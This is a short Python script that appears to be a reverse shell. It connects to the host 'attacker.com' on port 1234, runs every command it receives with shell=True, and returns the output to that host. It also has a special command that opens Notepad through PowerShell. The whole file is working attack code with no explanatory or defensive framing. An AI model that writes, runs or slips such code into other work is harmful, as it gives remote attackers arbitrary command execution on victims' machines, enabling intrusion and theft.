import socket
import subprocess


server_ip = 'attacker.com'
server_port = 1234
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server_ip, server_port))


while True:
    data = sock.recv(1024)
    if not data:
        break
    if data.decode().strip() == "open_notepad":
        cmd = subprocess.Popen("powershell.exe start notepad.exe", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        sock.send(b"Notepad opened")
    else:
        cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        sock.send(cmd.stdout.read())
        sock.send(cmd.stderr.read())

# Close the connection
sock.close()
